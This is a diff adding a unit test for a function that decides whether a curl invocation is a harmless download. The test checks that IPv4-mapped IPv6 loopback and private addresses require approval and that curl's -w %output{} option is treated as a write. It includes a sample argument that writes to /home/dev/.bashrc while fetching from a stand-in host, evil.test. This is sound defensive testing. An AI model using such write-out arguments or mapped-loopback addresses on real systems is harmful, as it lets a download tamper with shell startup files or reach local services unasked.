@@ -92,3 +92,16 @@ test('an address on the machine or a private network is not a plain download', (
     assert.equal(plainDownload([url]).plain, true, `${url} is a public page`);
   }
 });
+
+test('a mapped IPv6 loopback is judged as the IPv4 it maps to, and a write-out that names a file is a write to it', () => {
+  // The review's blockers: an IPv4-mapped address reached the machine without asking, and curl's -w can write to any path.
+  for (const url of ['http://[::ffff:127.0.0.1]/', 'http://[::ffff:7f00:1]/', 'http://[::ffff:192.168.1.1]/']) {
+    assert.equal(plainDownload([url]).plain, false, `${url} must ask`);
+  }
+  assert.equal(plainDownload(['http://[::ffff:8.8.8.8]/']).plain, true, 'a mapped public address is still public');
+  const written = plainDownload(['-w', '%output{/home/dev/.bashrc}x', 'https://evil.test/']);
+  assert.equal(written.plain, true);
+  assert.equal(written.output, '/home/dev/.bashrc', 'the reply is a write to that path, so the caller judges it');
+  // The ordinary status-code write-out is still harmless and reports no file.
+  assert.equal(plainDownload(['-w', 'code=%{http_code}', 'https://example.test/']).output, undefined);
+});
